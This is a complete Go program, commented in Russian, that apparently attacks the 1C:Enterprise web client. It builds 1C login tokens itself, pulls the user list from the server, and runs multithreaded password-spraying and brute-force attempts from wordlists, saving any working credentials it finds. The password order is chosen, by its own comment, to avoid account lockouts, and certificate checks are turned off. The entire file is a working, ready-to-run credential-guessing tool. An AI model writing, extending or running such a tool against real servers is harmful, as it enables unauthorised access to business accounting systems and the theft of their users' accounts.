package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"hash/crc32"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"regexp"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unicode"
)

// FIXED_IV используется для AES-CBC (для совместимости с 1С)
var FIXED_IV = []byte{157, 123, 154, 32, 105, 101, 187, 40, 6, 122, 72, 61, 178, 108, 113, 142}

type job struct {
	username string
	password string
}

// httpClient с поддержкой TLS 1.0+ и самоподписанных корпоративных сертификатов
var httpClient = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, //nolint: корпоративные серверы 1С используют самоподписанные сертификаты
			MinVersion:         tls.VersionTLS10,
		},
	},
}

// pad выполняет PKCS#7 padding.
func pad(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...)
}

// generateAuthToken создаёт токен аутентификации 1С.
func generateAuthToken(password, username string) (string, error) {
	token := []byte{0x01}

	randomBlock1 := make([]byte, 32)
	if _, err := rand.Read(randomBlock1); err != nil {
		return "", err
	}
	h1 := sha1.Sum([]byte(password))
	key1 := sha256.Sum256([]byte(base64.StdEncoding.EncodeToString(h1[:])))
	block1, err := aes.NewCipher(key1[:])
	if err != nil {
		return "", err
	}
	enc1 := make([]byte, len(pad(randomBlock1, aes.BlockSize)))
	cipher.NewCBCEncrypter(block1, FIXED_IV).CryptBlocks(enc1, pad(randomBlock1, aes.BlockSize))
	token = append(token, byte(len(enc1)))
	token = append(token, enc1...)

	randomBlock2 := make([]byte, 32)
	if _, err := rand.Read(randomBlock2); err != nil {
		return "", err
	}
	h2 := sha1.Sum([]byte(strings.ToUpper(password)))
	key2 := sha256.Sum256([]byte(base64.StdEncoding.EncodeToString(h2[:])))
	block2, err := aes.NewCipher(key2[:])
	if err != nil {
		return "", err
	}
	enc2 := make([]byte, len(pad(randomBlock2, aes.BlockSize)))
	cipher.NewCBCEncrypter(block2, FIXED_IV).CryptBlocks(enc2, pad(randomBlock2, aes.BlockSize))
	token = append(token, byte(len(enc2)))
	token = append(token, enc2...)

	usernameBytes := []byte(username)
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, uint32(len(usernameBytes)))
	token = append(token, lenBuf...)
	token = append(token, usernameBytes...)

	checksum := crc32.ChecksumIEEE(token)
	binary.LittleEndian.PutUint32(lenBuf, checksum)
	token = append(token, lenBuf...)

	return base64.StdEncoding.EncodeToString(token), nil
}

// getVersion получает версию информационной базы.
func getVersion(baseURL string) (string, error) {
	resp, err := httpClient.Get(baseURL + "/")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	re := regexp.MustCompile(`var VERSION = "([0-9.]+)"`)
	if m := re.FindSubmatch(body); len(m) >= 2 {
		return string(m[1]), nil
	}
	return "", fmt.Errorf("версия не найдена в ответе сервера")
}

// authenticate отправляет токен на сервер и возвращает результат.
func authenticate(baseURL, version, credentials string) (bool, error) {
	data, _ := json.Marshal(map[string]string{"cred": credentials})
	resp, err := httpClient.Post(
		fmt.Sprintf("%s/e1cib/login?version=%s", baseURL, version),
		"application/json",
		bytes.NewReader(data),
	)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200, nil
}

// fetchUsers получает список пользователей информационной базы.
func fetchUsers(baseURL string) ([]string, error) {
	resp, err := httpClient.Get(baseURL + "/e1cib/users")
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	var users []string
	for _, u := range strings.Split(string(body), "\r\n") {
		if u = strings.TrimSpace(u); u != "" {
			users = append(users, u)
		}
	}
	return users, nil
}

// checkCredentials генерирует токен и проверяет учетные данные.
func checkCredentials(baseURL, version, username, password string) bool {
	token, err := generateAuthToken(password, username)
	if err != nil {
		return false
	}
	ok, err := authenticate(baseURL, version, token)
	if err != nil {
		return false
	}
	return ok
}

// decodeUTF16LE декодирует байты UTF-16 LE в строку.
func decodeUTF16LE(b []byte) string {
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	runes := make([]rune, len(b)/2)
	for i := range runes {
		runes[i] = rune(b[2*i]) | rune(b[2*i+1])<<8
	}
	return string(runes)
}

// decodeUTF16BE декодирует байты UTF-16 BE в строку.
func decodeUTF16BE(b []byte) string {
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	runes := make([]rune, len(b)/2)
	for i := range runes {
		runes[i] = rune(b[2*i])<<8 | rune(b[2*i+1])
	}
	return string(runes)
}

// looksLikeUTF16LE проверяет, похож ли файл на UTF-16 LE без BOM.
// В UTF-16 LE нечётные байты (старший байт пары) для кириллицы = 0x04, для ASCII = 0x00.
func looksLikeUTF16LE(data []byte) bool {
	if len(data) < 8 || len(data)%2 != 0 {
		return false
	}
	check := len(data)
	if check > 200 {
		check = 200
	}
	matches := 0
	for i := 1; i < check; i += 2 {
		if data[i] == 0x00 || data[i] == 0x04 {
			matches++
		}
	}
	return matches*2 > check
}

// decodeTextBytes определяет кодировку по BOM (или эвристике) и возвращает текст в UTF-8.
func decodeTextBytes(data []byte) string {
	switch {
	case bytes.HasPrefix(data, []byte{0xEF, 0xBB, 0xBF}):
		return string(data[3:]) // UTF-8 BOM
	case bytes.HasPrefix(data, []byte{0xFF, 0xFE}):
		return decodeUTF16LE(data[2:]) // UTF-16 LE
	case bytes.HasPrefix(data, []byte{0xFE, 0xFF}):
		return decodeUTF16BE(data[2:]) // UTF-16 BE
	default:
		if looksLikeUTF16LE(data) {
			return decodeUTF16LE(data) // UTF-16 LE без BOM
		}
		return string(data)
	}
}

// parseLines разбивает текст на непустые очищенные строки.
func parseLines(text string) []string {
	text = strings.ReplaceAll(text, "\r\n", "\n")
	text = strings.ReplaceAll(text, "\r", "\n")
	var result []string
	for _, line := range strings.Split(text, "\n") {
		line = strings.Map(func(r rune) rune {
			if unicode.IsControl(r) || !unicode.IsPrint(r) {
				return -1
			}
			return r
		}, line)
		line = strings.TrimSpace(line)
		if line != "" {
			result = append(result, line)
		}
	}
	return result
}

// loadLinesFromFile загружает строки из файла с поддержкой UTF-8, UTF-8 BOM, UTF-16 LE/BE.
func loadLinesFromFile(filename string) ([]string, error) {
	data, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	return parseLines(decodeTextBytes(data)), nil
}

// countFileLines считает строки используя ту же логику что loadLinesFromFile.
// Для UTF-8 без BOM использует стриминг (экономия памяти для больших файлов паролей).
func countFileLines(filename string) int {
	f, err := os.Open(filename)
	if err != nil {
		log.Printf("Не удалось открыть файл %s: %v", filename, err)
		return 0
	}
	defer f.Close()

	// Читаем начало для определения кодировки
	header := make([]byte, 200)
	n, _ := f.Read(header)
	header = header[:n]

	// Любая специальная кодировка — грузим полностью через loadLinesFromFile
	needsFull := bytes.HasPrefix(header, []byte{0xEF, 0xBB, 0xBF}) ||
		bytes.HasPrefix(header, []byte{0xFF, 0xFE}) ||
		bytes.HasPrefix(header, []byte{0xFE, 0xFF}) ||
		looksLikeUTF16LE(header)
	if needsFull {
		f.Close()
		lines, err := loadLinesFromFile(filename)
		if err != nil {
			return 0
		}
		return len(lines)
	}

	// UTF-8 plain: стримим с той же фильтрацией что parseLines
	if _, err := f.Seek(0, io.SeekStart); err != nil {
		return 0
	}
	scanner := bufio.NewScanner(f)
	count := 0
	for scanner.Scan() {
		line := strings.Map(func(r rune) rune {
			if unicode.IsControl(r) || !unicode.IsPrint(r) {
				return -1
			}
			return r
		}, scanner.Text())
		if strings.TrimSpace(line) != "" {
			count++
		}
	}
	return count
}

// feedPasswordsFromFile читает файл паролей построчно и отправляет задачи в канал.
// UTF-8 файлы читаются потоком без загрузки в память; UTF-16 загружаются полностью.
func feedPasswordsFromFile(filename string, users []string, jobs chan<- job) error {
	f, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer f.Close()

	header := make([]byte, 200)
	n, _ := f.Read(header)
	header = header[:n]

	needsFull := bytes.HasPrefix(header, []byte{0xEF, 0xBB, 0xBF}) ||
		bytes.HasPrefix(header, []byte{0xFF, 0xFE}) ||
		bytes.HasPrefix(header, []byte{0xFE, 0xFF}) ||
		looksLikeUTF16LE(header)
	if needsFull {
		f.Close()
		lines, err := loadLinesFromFile(filename)
		if err != nil {
			return err
		}
		for _, password := range lines {
			for _, username := range users {
				jobs <- job{username, password}
			}
		}
		return nil
	}

	if _, err := f.Seek(0, io.SeekStart); err != nil {
		return err
	}
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		password := strings.Map(func(r rune) rune {
			if unicode.IsControl(r) || !unicode.IsPrint(r) {
				return -1
			}
			return r
		}, scanner.Text())
		password = strings.TrimSpace(password)
		if password == "" {
			continue
		}
		for _, username := range users {
			jobs <- job{username, password}
		}
	}
	return scanner.Err()
}

// uniqueStrings убирает дубликаты, сохраняя порядок.
func uniqueStrings(input []string) []string {
	seen := make(map[string]bool)
	var result []string
	for _, s := range input {
		if !seen[s] {
			seen[s] = true
			result = append(result, s)
		}
	}
	return result
}

// uniqueStringsSorted убирает дубликаты и сортирует строки.
func uniqueStringsSorted(input []string) []string {
	result := uniqueStrings(input)
	sort.Strings(result)
	return result
}

// makeProgressBar возвращает ASCII прогресс-бар.
func makeProgressBar(done, total int64, width int) string {
	if total == 0 {
		return "[" + strings.Repeat("-", width) + "]"
	}
	filled := int(float64(done) / float64(total) * float64(width))
	if filled > width {
		filled = width
	}
	bar := strings.Repeat("=", filled)
	if filled < width {
		bar += ">"
		bar += strings.Repeat(" ", width-filled-1)
	}
	return "[" + bar + "]"
}

// formatETA форматирует оставшееся время.
func formatETA(d time.Duration) string {
	d = d.Round(time.Second)
	if d <= 0 {
		return "0s"
	}
	h := int(d.Hours())
	m := int(d.Minutes()) % 60
	s := int(d.Seconds()) % 60
	if h > 0 {
		return fmt.Sprintf("%dh%02dm%02ds", h, m, s)
	}
	if m > 0 {
		return fmt.Sprintf("%dm%02ds", m, s)
	}
	return fmt.Sprintf("%ds", s)
}

func main() {
	// Извлекаем URL из аргументов ДО flag.Parse() — это позволяет флагам стоять в любом месте,
	// до или после URL (Go's flag.Parse останавливается на первом non-flag аргументе).
	var baseURL string
	filtered := []string{os.Args[0]}
	for _, arg := range os.Args[1:] {
		if (strings.HasPrefix(arg, "http://") || strings.HasPrefix(arg, "https://")) && baseURL == "" {
			baseURL = arg
		} else {
			filtered = append(filtered, arg)
		}
	}
	os.Args = filtered

	userFlag := flag.String("u", "", "Имя пользователя для проверки пароля")
	usersFileFlag := flag.String("U", "", "Файл со списком пользователей")
	passwordFlag := flag.String("p", "", "Пароль для перебора")
	passwordFlagSet := false
	passwordsFileFlag := flag.String("P", "", "Файл со списком паролей")
	getUsersFlag := flag.Bool("l", false, "Получить список пользователей из информационной базы")
	verboseFlag := flag.Bool("v", false, "Выводить все попытки, включая неудачные")
	threadsFlag := flag.Int("t", 1, "Количество параллельных потоков")
	outputFlag := flag.String("o", "", "Файл для сохранения результатов")
	flag.Parse()
	flag.Visit(func(f *flag.Flag) {
		if f.Name == "p" {
			passwordFlagSet = true
		}
	})

	// Если URL не нашли в args (не начинается с http), проверяем остаток от flag.Parse
	if baseURL == "" {
		if args := flag.Args(); len(args) > 0 {
			baseURL = args[0]
		}
	}
	if baseURL == "" {
		log.Fatal("URL не указан!\nИспользование: wb1c [флаги] <URL>\n  Флаги можно указывать до или после URL.")
	}
	if !strings.HasPrefix(baseURL, "http") {
		log.Fatalf("Некорректный URL: %s", baseURL)
	}

	version, err := getVersion(baseURL)
	if err != nil || version == "" {
		log.Fatalf("Не удалось определить версию! URL: %s, ошибка: %v", baseURL, err)
	}

	// Режим только получения списка пользователей
	if *getUsersFlag && *userFlag == "" && *usersFileFlag == "" && !passwordFlagSet && *passwordsFileFlag == "" {
		users, err := fetchUsers(baseURL)
		if err != nil {
			log.Fatalf("Не удалось получить список пользователей: %v", err)
		}
		if len(users) == 0 {
			log.Fatal("Не удалось получить список пользователей!")
		}
		log.Printf("Найдено пользователей: %d", len(users))
		for _, user := range users {
			fmt.Println(user)
		}
		if *outputFlag != "" {
			if err := os.WriteFile(*outputFlag, []byte(strings.Join(users, "\n")), 0644); err != nil {
				log.Printf("Ошибка сохранения: %v", err)
			} else {
				log.Printf("Список сохранён в %s", *outputFlag)
			}
		}
		os.Exit(0)
	}

	// Загружаем пользователей
	var users []string
	if *userFlag != "" {
		users = append(users, *userFlag)
	}
	if *usersFileFlag != "" {
		lines, err := loadLinesFromFile(*usersFileFlag)
		if err != nil {
			log.Printf("Ошибка чтения файла с пользователями (%s): %v", *usersFileFlag, err)
		} else if len(lines) == 0 {
			log.Printf("Предупреждение: файл пользователей пустой или кодировка не распознана: %s", *usersFileFlag)
		} else {
			users = append(users, lines...)
		}
	}
	if *getUsersFlag {
		fetched, err := fetchUsers(baseURL)
		if err != nil {
			log.Printf("Ошибка получения пользователей с сервера: %v", err)
		} else {
			users = append(users, fetched...)
		}
	}
	users = uniqueStringsSorted(users)
	if len(users) == 0 {
		log.Fatal("Пользователи не загружены!")
	}

	// Подсчёт паролей
	var inlinePws []string
	if passwordFlagSet {
		inlinePws = []string{*passwordFlag}
	}
	pwFileCount := 0
	if *passwordsFileFlag != "" {
		pwFileCount = countFileLines(*passwordsFileFlag)
		if pwFileCount == 0 {
			log.Printf("Предупреждение: файл паролей пустой или недоступен: %s", *passwordsFileFlag)
		}
	}
	pwTotal := len(inlinePws) + pwFileCount
	if pwTotal == 0 {
		log.Fatal("Пароли не загружены!")
	}

	// Спрей-режим: много пользователей, мало паролей — перебираем один пароль по всем.
	// Порядок: for password → for user (защита от блокировок аккаунтов).
	// Брут-режим: несколько пользователей, много паролей — перебираем все пароли на каждого.
	sprayMode := len(users) > pwTotal

	var sprayPws []string
	if sprayMode {
		sprayPws = append(sprayPws, inlinePws...)
		if *passwordsFileFlag != "" {
			lines, err := loadLinesFromFile(*passwordsFileFlag)
			if err != nil {
				log.Printf("Ошибка чтения файла паролей: %v", err)
			} else {
				sprayPws = append(sprayPws, lines...)
			}
		}
		sprayPws = uniqueStrings(sprayPws)
		pwTotal = len(sprayPws)
	}

	// Ctrl+C
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Fprintln(os.Stderr, "\nПрервано.")
		os.Exit(0)
	}()

	total := int64(len(users)) * int64(pwTotal)
	workers := *threadsFlag
	if workers < 1 {
		workers = 1
	}

	// Шапка
	fmt.Fprintln(os.Stderr)
	fmt.Fprintf(os.Stderr, "  Цель:    %s  (v%s)\n", baseURL, version)
	if sprayMode {
		fmt.Fprintf(os.Stderr, "  Режим:   спрей  |  пользователей: %d  |  паролей: %d  |  попыток: %d\n",
			len(users), pwTotal, total)
	} else {
		fmt.Fprintf(os.Stderr, "  Режим:   брут   |  пользователей: %d  |  паролей: %d  |  попыток: %d\n",
			len(users), pwTotal, total)
	}
	fmt.Fprintf(os.Stderr, "  Потоков: %d\n\n", workers)

	jobs := make(chan job, workers*4)
	var wg sync.WaitGroup
	var mu sync.Mutex
	var tried int64
	var results []string

	start := time.Now()

	// Прогресс-бар (отключается в verbose-режиме)
	progressDone := make(chan struct{})
	var progressWg sync.WaitGroup
	if !*verboseFlag {
		progressWg.Add(1)
		go func() {
			defer progressWg.Done()
			ticker := time.NewTicker(200 * time.Millisecond)
			defer ticker.Stop()
			for {
				select {
				case <-ticker.C:
					n := atomic.LoadInt64(&tried)
					elapsed := time.Since(start).Seconds()
					speed := 0.0
					if elapsed > 0.5 {
						speed = float64(n) / elapsed
					}
					eta := "?"
					if speed > 0 && total > n {
						eta = formatETA(time.Duration(float64(total-n) / speed * float64(time.Second)))
					}
					pct := float64(n) * 100 / float64(total)
					bar := makeProgressBar(n, total, 30)
					line := fmt.Sprintf("  %s  %d/%d  %.1f%%  %.0f/s  ETA %s",
						bar, n, total, pct, speed, eta)
					mu.Lock()
					fmt.Fprintf(os.Stderr, "\r%-80s", line)
					mu.Unlock()
				case <-progressDone:
					return
				}
			}
		}()
	}

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobs {
				n := atomic.AddInt64(&tried, 1)
				if *verboseFlag {
					log.Printf("[%d/%d] %s:%s", n, total, j.username, j.password)
				}
				if checkCredentials(baseURL, version, j.username, j.password) {
					mu.Lock()
					results = append(results, fmt.Sprintf("%s:%s", j.username, j.password))
					if !*verboseFlag {
						fmt.Fprintf(os.Stderr, "\r%-80s\r", "")
					}
					fmt.Printf("[+] %s : %s\n", j.username, j.password)
					mu.Unlock()
				} else if *verboseFlag {
					log.Printf("[-] %s:%s", j.username, j.password)
				}
			}
		}()
	}

	if sprayMode {
		// Спрей: for password → for user (один пароль на всех, потом следующий)
		for _, pass := range sprayPws {
			for _, user := range users {
				jobs <- job{user, pass}
			}
		}
	} else {
		// Брут: for user → for password, пароли стримятся из файла
		for _, pass := range inlinePws {
			for _, user := range users {
				jobs <- job{user, pass}
			}
		}
		if *passwordsFileFlag != "" {
			if err := feedPasswordsFromFile(*passwordsFileFlag, users, jobs); err != nil {
				log.Printf("Ошибка чтения файла паролей: %v", err)
			}
		}
	}
	close(jobs)
	wg.Wait()

	close(progressDone)
	progressWg.Wait()
	elapsed := time.Since(start).Round(time.Second)
	fmt.Fprintf(os.Stderr, "\r%-80s\r\n", "")
	fmt.Fprintf(os.Stderr, "  Завершено  |  проверено: %d  |  найдено: %d  |  время: %s\n\n",
		tried, len(results), elapsed)

	if *outputFlag != "" && len(results) > 0 {
		if err := os.WriteFile(*outputFlag, []byte(strings.Join(results, "\n")), 0644); err != nil {
			log.Printf("Ошибка сохранения: %v", err)
		} else {
			log.Printf("Результаты сохранены в %s", *outputFlag)
		}
	}
}
